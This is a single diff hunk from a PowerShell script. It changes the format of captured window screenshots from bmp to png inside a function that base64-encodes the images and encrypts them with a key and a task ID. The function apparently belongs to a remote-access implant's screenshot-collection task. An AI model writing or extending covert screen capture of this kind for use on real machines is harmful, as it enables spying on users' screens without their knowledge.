@@ -410,7 +410,7 @@ function Get-ScreenshotAllWindows {
 		   	[IntPtr] $windowHandle = $p.MainWindowHandle;
 			$msimage = New-Object IO.MemoryStream
             $bitmap = [WindowStation]::Capture($windowHandle);
-			$bitmap.save($msimage, "bmp")
+			$bitmap.save($msimage, "png")
             $b64 = [Convert]::ToBase64String($msimage.toarray())
             $bitmap.Dispose();
             $eid = Encrypt-String $key $TaskId
